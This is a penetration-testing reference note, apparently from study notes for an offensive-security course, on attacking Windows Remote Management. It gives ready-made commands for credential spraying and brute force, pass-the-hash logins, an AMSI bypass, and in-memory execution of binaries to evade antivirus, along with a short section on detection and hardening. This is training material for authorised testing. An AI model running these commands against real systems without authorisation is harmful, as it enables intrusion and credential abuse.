# WinRM

#WinRM #WindowsRemoteManagement #localsystemmanagement

## What is WinRM?
Windows Remote Management — Microsoft's WS-Management (WS-Man) implementation for remote command execution over SOAP/HTTP. PowerShell Remoting is built on it. Enabled by default on Windows Server 2012+; **not** on by default on client Windows. On an engagement it's the cleanest interactive foothold once you hold creds/a hash: membership in **Remote Management Users** (or local admin) is all it takes, and `evil-winrm` turns that into a full PowerShell shell.

- Port **TCP 5985** — WinRM over HTTP (SOAP); **TCP 5986** — WinRM over HTTPS (TLS)
- WinRS (Windows Remote Shell) — the shell subcomponent
- Access requires membership in **Remote Management Users** or **Administrators**

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Lateral Movement/evil-winrm\|evil-winrm]] | The primary WinRM shell — password/PtH/Kerberos, upload/download, AMSI bypass, in-memory exec |
| [[Tools/Lateral Movement/NetExec\|NetExec]] | `nxc winrm` — validate creds/hash, spray, `-x`/`-X` command exec |
| [[Tools/Auth/Hydra\|Hydra]] | Online brute (`winrm://`) |
| [[Tools/Scanning/NMAP\|NMAP]] | `http-auth-finder` + version on 5985/5986 |
| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `scanner/winrm/winrm_auth_methods`, `winrm_login` |

PowerShell Remoting (`Enter-PSSession`/`Invoke-Command`) and `winrs` are the native Windows clients, used inline below.

---

## Configuration

```powershell
# Enable WinRM (run as admin on target)
Enable-PSRemoting -Force

# Check WinRM status
winrm enumerate winrm/config/listener

# Allow specific host
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "192.168.1.100"
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*"  # all hosts (insecure)

# WinRM firewall rule
netsh advfirewall firewall add rule name="WinRM" dir=in action=allow protocol=TCP localport=5985
```

---

## Enumeration

```bash
# Nmap
nmap -p 5985,5986 --script http-auth-finder,banner -sV <target>

# Check if WinRM open/accepting auth
curl -s -o /dev/null -w "%{http_code}" http://<target>:5985/wsman

# NetExec (nxc)
nxc winrm <target>
nxc winrm <target> -u user -p pass
nxc winrm <target/24> -u users.txt -p passwords.txt

# Metasploit
use auxiliary/scanner/winrm/winrm_auth_methods
use auxiliary/scanner/winrm/winrm_login
```

---

## Connect / Access

### evil-winrm (Primary Tool)

```bash
# Password auth
evil-winrm -i <target> -u <user> -p <password>

# Pass-the-Hash
evil-winrm -i <target> -u <user> -H <NTLM_hash>

# Kerberos (requires valid TGT in KRB5CCNAME)
evil-winrm -i <target> -u <user> -r <realm>

# With SSL (port 5986)
evil-winrm -i <target> -u <user> -p <pass> -S
evil-winrm -i <target> -u <user> -p <pass> -S -c cert.pem -k key.pem

# With scripts directory
evil-winrm -i <target> -u <user> -p <pass> -s /usr/share/powershell-empire/empire/server/data/module_source/

# With exe directory
evil-winrm -i <target> -u <user> -p <pass> -e /opt/tools/
```

### evil-winrm Built-in Commands

```
# File transfer
upload /local/path/file.exe
download C:\remote\file.txt

# Load PowerShell script into session
menu  # lists available scripts if -s was set
Invoke-BloodHound -CollectionMethod All  # after loading BloodHound script

# Bypass AMSI (built-in)
Bypass-4MSI

# Run .exe from memory (bypass av)
Invoke-Binary /path/to/binary.exe
```

### PowerShell Remoting

```powershell
# From Windows
Enter-PSSession -ComputerName <target> -Credential (Get-Credential)
Enter-PSSession -ComputerName <target> -Credential domain\user

# Create reusable session
$sess = New-PSSession -ComputerName <target> -Credential domain\user
Enter-PSSession -Session $sess

# Run single command
Invoke-Command -ComputerName <target> -Credential domain\user -ScriptBlock { whoami }
Invoke-Command -ComputerName <target> -Credential domain\user -FilePath C:\script.ps1

# Run against multiple hosts
Invoke-Command -ComputerName host1,host2 -Credential domain\user -ScriptBlock { hostname }
```

### winrs (Windows Remote Shell)

```cmd
winrs -r:http://<target>:5985/wsman -u:<user> -p:<pass> cmd
winrs -r:<target> -u:<user> -p:<pass> "whoami /all"
winrs -r:<target> -u:<user> -p:<pass> powershell -c "Get-Process"
```

---

## Attack Vectors

### Brute Force

```bash
nxc winrm <target> -u users.txt -p passwords.txt
hydra -L users.txt -P passwords.txt winrm://<target>
```

### Pass-the-Hash

```bash
evil-winrm -i <target> -u <user> -H <NTLM_hash>
nxc winrm <target> -u <user> -H <NTLM_hash>
```

### With Compromised Credentials

```bash
# Spray across AD hosts
nxc winrm 192.168.1.0/24 -u domainuser -p 'Password123'

# Execute commands
nxc winrm <target> -u <user> -p <pass> -x "whoami"
nxc winrm <target> -u <user> -p <pass> -X "Get-LocalUser"  # PowerShell
```

---

## Detection & Artefacts

- **Every WinRM session spawns `wsmprovhost.exe`** on the target — that process (and any children it launches) is the primary tell; `evil-winrm`'s `Invoke-Binary`/`Bypass-4MSI` run as children of it.
- **Logons are type 3 (network)**, event **4624**, plus WinRM-Operational and PowerShell **4103/4104** (script-block logging) — `Bypass-4MSI` and downloaded scripts show in 4104.
- **Brute force** = repeated 5985 auth failures (4625) / `nxc winrm` runs.
- Defensive baseline: HTTPS-only (5986), don't set `TrustedHosts = *`, restrict Remote Management Users, put admins in **Protected Users** (blocks PtH), and enable PowerShell script-block + module logging.

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| WinRM exposed to internet (5985/5986) | Brute force / exploitation |
| `TrustedHosts = *` | Any machine can connect |
| HTTP (5985) not HTTPS | Cleartext credentials |
| Weak credentials on admin accounts | Remote shell access |
| PTH enabled (no Protected Users) | Pass-the-Hash |

---

## Quick Reference

| Goal | Command |
|---|---|
| Connect (password) | `evil-winrm -i host -u user -p pass` |
| Connect (PTH) | `evil-winrm -i host -u user -H NTLMhash` |
| Connect (SSL) | `evil-winrm -i host -u user -p pass -S` |
| Upload file | `upload /local/file` (inside evil-winrm) |
| Download file | `download C:\file.txt` (inside evil-winrm) |
| Spray with nxc | `nxc winrm host -u users.txt -p pass.txt` |
| Run command | `nxc winrm host -u user -p pass -x "cmd"` |
| PS remoting | `Invoke-Command -ComputerName host -Credential cred -ScriptBlock {...}` |
| Nmap check | `nmap -p 5985,5986 -sV host` |

---

> [!note] **See also** — sibling remote-exec channels [[Services/Local System Management/WMI|WMI]] and [[Services/File Xfer/SMB|SMB]] (psexec/smbexec); both ride [[Services/Local System Management/RPC|RPC]]. Shell/PtH context in [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]].

---

*Created: 2026-07-13*
*Updated: 2026-09-23*
*Model: claude-opus-4-8*
